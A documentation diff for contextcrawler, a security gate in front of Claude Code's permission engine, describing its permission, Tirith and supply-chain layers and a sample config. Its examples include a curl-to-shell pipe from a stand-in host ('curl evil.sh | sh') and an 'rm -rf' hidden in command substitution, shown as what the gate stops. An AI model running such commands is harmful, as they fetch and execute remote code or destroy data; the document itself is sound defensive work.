@@ -20,6 +20,69 @@ runs. Tirith returns one of:
 A separate supply-chain gate inspects `npm`/`pip`-class install commands;
 it is opt-in via `~/.config/contextcrawler/supply-chain.toml`.
 
+## The three layers
+
+contextcrawler runs three independent checks before a hook-routed command
+is allowed to execute. They are layered, not alternatives:
+
+| Layer | What it does | Default state |
+|---|---|---|
+| **Permission gate (#2286)** | Maps the command to Claude Code's deny/ask/allow rules and refuses to *auto-allow* anything it cannot attest (command substitution, file-write redirect). | Always on. |
+| **Tirith pre-execution gate** | Subprocess-calls `tirith check` to flag shell-syntax attack shapes (the curl-to-shell pipe, homoglyph hosts, plain-HTTP-to-sink). | Opt-in / fail-open. |
+| **Supply-chain install gate** | Vets `npm`/`pip`-class installs against registry publish time and OSV.dev CVEs. | Opt-in (`supply_chain.enabled`). |
+
+The permission gate decides *who confirms* (auto-allow vs prompt the
+user). The Tirith and supply-chain gates can only *downgrade* an
+auto-allow to a prompt (Ask) or, for a supply-chain hard block, deny.
+None of them can silently upgrade a command to auto-allow.
+
+## The permission gate: never silently auto-allow (#2286)
+
+This is the part of the gate that is always on, with no env knob to turn
+it off. It is the security model contextcrawler enforces in front of the
+agent's own permission engine.
+
+Every command is decomposed into segments (compound chains, subshells,
+substitution payloads) and checked against the deny / ask / allow rules
+with precedence **Deny > Ask > Allow > Default**. `Default` (no rule
+matched) is treated as **Ask**, matching Claude Code's least-privilege
+default. Two rules make this safe:
+
+- **Every segment must independently match an allow rule** for the whole
+  command to auto-allow (#1213). A single allowed segment can no longer
+  escalate the entire chain, so `git status && curl evil.sh | sh` cannot
+  ride in on the `git status` allow.
+- **An unattestable construct downgrades to Ask** regardless of the allow
+  rules. contextcrawler cannot reason about what a command substitution
+  will expand to, or where a file-write redirect will land, so it refuses
+  to auto-allow them and defers to you:
+
+  | Construct | Auto-allow? |
+  |---|---|
+  | Command substitution: `$(...)`, backticks | No -> Ask |
+  | Process substitution: `<(...)`, `>(...)` | No -> Ask |
+  | File-write redirect: `>file`, `>>file`, `>&file`, `&>file` | No -> Ask |
+  | fd-dup: `2>&1`, `>&2` | Yes (still evaluable) |
+  | `/dev/null` redirect | Yes (still evaluable) |
+
+  So `git status $(whoami)` will **not** auto-allow through a
+  `Bash(git:*)` rule. It downgrades to an Ask prompt with the reason
+  "command is not auto-evaluable (command substitution or file-write
+  redirect) with no safe rewrite".
+
+A **deny** rule still wins over everything. The deny pass runs over every
+decomposed segment *first* (including the inner command of a
+substitution), so a deny-ruled command hidden inside `echo $(rm -rf
+/tmp/x)` is blocked, not waved through (SEC-C2). Deny pre-empts even an
+unattestable construct.
+
+This model is enforced on **both** integration paths: the live
+`contextcrawler hook claude` path (`src/hooks/hook_cmd.rs`) and the
+legacy `contextcrawler rewrite` path (`src/hooks/rewrite_cmd.rs`). Both
+consult the same `permissions::check_command`, so there is no integration
+where an unattestable command silently auto-allows. The behaviour is
+ported from upstream `rtk-ai/rtk#2286`.
+
 ## Read the prompt — it tells you how to allow it
 
 When the gate downgrades a command to Ask, ContextCrawler now fills the
@@ -164,6 +227,44 @@ executes. When a gate flags a proxied command, proxy refuses with exit 126:
   review: re-run with `CONTEXTCRAWLER_PROXY_ACK=1`.
 - A gate **block** (supply-chain hard block) cannot be overridden by the
   ack variable — restructure the command or use `tirith trust`.
+
+## Enabling the supply-chain gate
+
+The supply-chain gate is off until you write a config file. The first of
+these that exists wins:
+
+1. `$XDG_CONFIG_HOME/contextcrawler/supply-chain.toml`
+2. `~/.config/contextcrawler/supply-chain.toml`
+3. `dirs::config_dir()/contextcrawler/supply-chain.toml`
+   (`~/.config` on Linux, `~/Library/Application Support` on macOS,
+   `AppData` on Windows)
+
+```toml
+[supply_chain]
+enabled = true              # off by default; this line turns the gate on
+
+[npm]
+cooldown_days = 3           # flag a package whose latest version is < N days old
+block_severity = "HIGH"     # block on OSV CVEs at or above this severity
+allow_editable = false      # treat -e / path / URL installs as unvettable -> Ask
+
+[pypi]
+cooldown_days = 3
+block_severity = "HIGH"
+allow_editable = true
+
+[overrides]
+always_allow = ["my-internal-pkg"]
+always_deny  = ["known-bad-pkg"]
+```
+
+When enabled, an install that fails the age cooldown or carries a
+qualifying CVE downgrades the auto-allow to Ask; an install whose package
+set cannot be enumerated (a lockfile / `requirements.txt` / constraints
+install) also fails closed to Ask rather than being waved through. A
+single command run against a hostile or slow registry is bounded by an
+aggregate wall-clock budget and a per-command package cap, so the gate
+cannot stall the agent.
 
 ## Turning the gate off
 
